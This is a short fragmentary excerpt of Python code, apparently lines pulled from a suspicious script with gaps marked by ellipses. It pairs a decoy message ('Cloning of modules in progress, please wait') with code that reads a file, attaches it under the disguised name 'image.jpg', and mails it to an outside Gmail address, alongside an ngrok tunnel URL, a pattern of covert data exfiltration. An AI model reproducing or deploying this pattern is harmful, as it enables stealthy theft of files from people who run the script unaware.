...
print("Cloning of modules in progress, please wait")
...
server.sendmail(msg['From'], ['alex.pocofon@gmail.com'], msg.as_string())
...
url = "https://b74418f5ceda.ngrok.io"
...
part = MIMEApplication(open(str(soup), 'rb').read())
part.add_header('Content-Disposition', 'attachment', filename='image.jpg')
msg.attach(part)
